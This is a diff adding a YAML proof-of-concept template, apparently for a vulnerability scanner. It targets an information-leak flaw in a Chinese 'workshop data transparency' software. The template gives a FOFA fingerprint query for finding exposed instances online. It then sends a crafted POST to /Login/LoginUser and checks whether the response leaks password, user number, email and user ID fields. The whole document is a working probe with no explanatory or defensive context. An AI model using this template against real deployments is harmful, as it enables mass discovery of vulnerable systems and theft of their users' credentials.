@@ -1,0 +1,20 @@
+id: poc-yaml-business-management-system-info-leak
+info:
+  name: 车间数据透明化软件LoginUser存在信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: 车间数据透明化软件
+  fofa: body:"/Content/LayuiAdmin/login/css/index.css"
+requests:
+- method: POST
+  path: /Login/LoginUser
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+    X-Requested-With: XMLHttpRequest
+  data: '{"RecordID":"admin","password":"11111","undefined":"登录","language":"zh-CN"}'
+  expression: "status_code == 200 && \ncontains(body,\"\\\"PASSQORD\\\"\") &&\ncontains(body,\"\
+    \\\"USERNO\\\"\") &&\ncontains(body,\"\\\"EMAIL\\\"\") &&\ncontains(body,\"\\\"\
+    USERID\\\"\")\n"
+variables: {}
+transport: http
